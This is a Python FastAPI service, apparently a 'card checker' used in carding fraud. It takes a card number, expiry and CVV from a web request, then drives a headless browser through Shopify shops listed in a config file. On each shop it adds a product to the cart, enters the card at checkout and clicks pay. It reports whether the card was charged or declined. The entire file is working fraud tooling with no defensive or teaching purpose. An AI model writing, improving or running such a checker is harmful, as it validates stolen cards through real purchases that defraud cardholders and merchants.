import os
import re
import json
import asyncio
import uvicorn
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from playwright.async_api import async_playwright

app = FastAPI(title="api create by Ali sindhi", version="4.0.0")

# ---------- CORS ----------
ALLOWED_ORIGINS = os.getenv("ALLOWED_ORIGINS", "*").split(",")
app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ---------- Config ----------
SITES_FILE = os.getenv("SITES_FILE", "sites.json")
DEFAULT_GATE = os.getenv("DEFAULT_GATE", "Shopify Payments")
DEFAULT_STATUS = os.getenv("DEFAULT_STATUS", "ORDER_PAID")
DEFAULT_RESPONSE = os.getenv("DEFAULT_RESPONSE", "Approved")

SITES = []
price_cache = {}
site_health = {}
last_health_check = 0
HEALTH_INTERVAL = int(os.getenv("HEALTH_INTERVAL", "300"))

def load_sites():
    global SITES
    with open(SITES_FILE, "r", encoding="utf-8") as f:
        SITES = json.load(f)
    print(f"[CONFIG] Loaded {len(SITES)} sites")

# ---------- Helpers ----------
def detect_card_type(card_number: str) -> str:
    card = re.sub(r"\D", "", card_number)
    if not card:
        return "UNKNOWN"
    if card.startswith(("34", "37")):
        return "AMEX"
    if card.startswith("4"):
        return "VISA"
    if card.startswith(("5", "2")):
        return "MASTERCARD"
    return "UNKNOWN"

def extract_price_from_text(text: str):
    match = re.search(r'\$\s?(\d+(?:\.\d{1,2})?)', text)
    if match:
        return match.group(1)
    return None

async def scrape_site_price(playwright, site_url):
    browser = await playwright.chromium.launch(headless=True)
    page = await browser.new_page()
    try:
        await page.goto(site_url, timeout=20000, wait_until="domcontentloaded")
        selectors = [
            '[class*="price"]',
            '[data-price]',
            '.product-price',
            '.price',
            'span.money',
            '[class*="Price"]'
        ]
        for sel in selectors:
            elements = await page.query_selector_all(sel)
            for el in elements:
                text = (await el.inner_text()).strip()
                price = extract_price_from_text(text)
                if price:
                    await browser.close()
                    return price
        body_text = await page.inner_text("body")
        price = extract_price_from_text(body_text)
        await browser.close()
        return price or "2.95"
    except Exception as e:
        print(f"[SCRAPE ERROR] {site_url}: {e}")
        await browser.close()
        return None

async def get_site_price(site):
    name = site.get("name")
    url = site.get("checkout_url")
    if site.get("price") and site["price"] != "AUTO":
        return site["price"]
    if name in price_cache:
        return price_cache[name]
    async with async_playwright() as p:
        price = await scrape_site_price(p, url)
    if price:
        price_cache[name] = price
    else:
        price_cache[name] = "2.95"
    return price_cache[name]

async def health_check_site(playwright, site):
    url = site.get("checkout_url")
    browser = await playwright.chromium.launch(headless=True)
    page = await browser.new_page()
    try:
        await page.goto(url, timeout=15000, wait_until="domcontentloaded")
        # Working agar koi product link ya checkout link mil jaye
        product_link = await page.query_selector('a[href*="/products/"], a[href*="/cart"], a[href*="/checkout"]')
        if product_link:
            await browser.close()
            return True
        # Agar direct checkout form ho
        form = await page.query_selector('form[action*="/cart"], input[name="checkout"], button[name="checkout"]')
        await browser.close()
        return form is not None
    except:
        await browser.close()
        return False

async def update_health():
    global site_health, last_health_check
    working = {}
    async with async_playwright() as p:
        for site in SITES:
            name = site["name"]
            ok = await health_check_site(p, site)
            working[name] = ok
            print(f"[HEALTH] {name}: {'WORKING' if ok else 'DEAD'}")
    site_health = working
    last_health_check = asyncio.get_event_loop().time()

async def attempt_card_charge(site, card_data):
    name = site["name"]
    url = site["checkout_url"]
    price = await get_site_price(site)

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            page = await browser.new_page()
            await page.goto(url, timeout=20000, wait_until="domcontentloaded")

            product_link = await page.query_selector('a[href*="/products/"]')
            if product_link:
                product_url = await product_link.get_attribute("href")
                if not product_url.startswith("http"):
                    product_url = url.rstrip("/") + product_url
                await page.goto(product_url, timeout=20000, wait_until="domcontentloaded")

                add_btn = await page.query_selector('button[name="add"], button[type="submit"], #AddToCart')
                if add_btn:
                    await add_btn.click()
                    await page.wait_for_load_state("domcontentloaded", timeout=15000)

            await page.goto(url.rstrip("/") + "/checkout", timeout=20000, wait_until="domcontentloaded")

            # Fill card details
            await page.fill('input[name="cardnumber"], input[name="number"]', card_data["number"])
            await page.fill('input[name="expiry"], input[name="exp-date"]', f'{card_data["month"]}/{card_data["year"]}')
            await page.fill('input[name="cvc"], input[name="verification_value"]', card_data["cvv"])

            # Click pay
            await page.click('button[type="submit"], #pay-button, button:has-text("Pay now")')
            await page.wait_for_load_state("domcontentloaded", timeout=30000)

            content = await page.content()
            lower = content.lower()
            await browser.close()

            if any(kw in lower for kw in ["thank you", "order confirmed", "success"]):
                return ("CHARGED", price, DEFAULT_GATE, DEFAULT_STATUS, name)
            elif any(kw in lower for kw in ["declined", "failed", "unable to process"]):
                return ("Declined", price, DEFAULT_GATE, "ORDER_FAILED", name)
            else:
                return ("Error", price, DEFAULT_GATE, "ORDER_UNKNOWN", name)
    except Exception as e:
        return ("Error", price, DEFAULT_GATE, f"ERROR: {str(e)[:80]}", name)

# ---------- Endpoints ----------
@app.on_event("startup")
async def startup_event():
    load_sites()
    asyncio.create_task(update_health())

@app.get("/")
async def checker(request: Request):
    global site_health, last_health_check
    try:
        params = request.query_params
        card_number = params.get("card") or params.get("number") or ""
        month = params.get("month") or "12"
        year = params.get("year") or "2026"
        cvv = params.get("cvv") or "123"

        if not card_number:
            return {"Response": "Error", "Price": "-", "Gate": DEFAULT_GATE, "Status": "MISSING_CARD"}

        card_data = {"number": card_number, "month": month, "year": year, "cvv": cvv}

        if not site_health or (asyncio.get_event_loop().time() - last_health_check > HEALTH_INTERVAL):
            await update_health()

        working_sites = [s for s in SITES if site_health.get(s["name"], False)]
        if not working_sites:
            return {"Response": "Error", "Price": "-", "Gate": DEFAULT_GATE, "Status": "NO_WORKING_SITES"}

        for site in working_sites:
            response, price, gate, status, site_name = await attempt_card_charge(site, card_data)
            if response != "Error":
                return {
                    "Response": response,
                    "Price": price,
                    "Gate": gate,
                    "Status": status,
                    "Site": site_name
                }

        return {"Response": "Error", "Price": "-", "Gate": DEFAULT_GATE, "Status": "ALL_SITES_ERROR"}
    except Exception as e:
        return {
            "Response": "Error",
            "Price": "-",
            "Gate": DEFAULT_GATE,
            "Status": f"EXCEPTION: {str(e)[:100]}"
        }

@app.get("/health")
async def health():
    return {
        "status": "healthy",
        "service": "smart-checker",
        "working_sites": sum(1 for v in site_health.values() if v),
        "total_sites": len(SITES)
    }

@app.get("/run-health")
async def run_health():
    await update_health()
    return {
        "status": "complete",
        "working_sites": sum(1 for v in site_health.values() if v),
        "total_sites": len(SITES),
        "details": site_health
    }

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    uvicorn.run("main:app", host="0.0.0.0", port=port, reload=False)
